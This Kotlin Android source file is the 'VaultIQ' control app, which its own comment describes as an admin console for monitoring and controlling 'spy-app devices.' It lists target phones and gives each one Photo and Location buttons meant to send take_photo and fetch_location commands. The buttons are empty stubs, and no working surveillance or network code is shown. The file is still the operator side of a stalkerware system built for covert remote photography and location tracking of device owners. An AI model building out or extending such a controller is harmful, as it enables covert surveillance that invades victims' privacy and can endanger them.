package com.devicemonitor.control

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp

/**
 * VAULTIQ CONTROL APP
 * This app is used by the admin to monitor and control the spy-app devices.
 */
class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            ControlAppTheme {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    DeviceControlScreen()
                }
            }
        }
    }
}

@Composable
fun DeviceControlScreen() {
    // This state would be fetched from Supabase in a real implementation
    val devices = remember { mutableStateListOf("Samsung Galaxy S21", "Google Pixel 7", "Xiaomi Redmi Note 12") }

    Column(modifier = Modifier.padding(16.dp)) {
        Text(text = "VaultIQ Control Center", style = MaterialTheme.typography.headlineMedium)
        Spacer(modifier = Modifier.height(16.dp))
        
        LazyColumn {
            items(devices) { device ->
                DeviceItem(name = device)
            }
        }
    }
}

@Composable
fun DeviceItem(name: String) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 8.dp),
        elevation = CardDefaults.cardElevation(defaultElevation = 4.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Text(text = name, style = MaterialTheme.typography.titleLarge)
            Row(modifier = Modifier.padding(top = 8.dp)) {
                Button(onClick = { /* Send Command: take_photo */ }) {
                    Text("📸 Photo")
                }
                Spacer(modifier = Modifier.width(8.dp))
                Button(onClick = { /* Send Command: fetch_location */ }) {
                    Text("📍 Location")
                }
            }
        }
    }
}

@Composable
fun ControlAppTheme(content: @Composable () -> Unit) {
    MaterialTheme(colorScheme = lightColorScheme(), content = content)
}
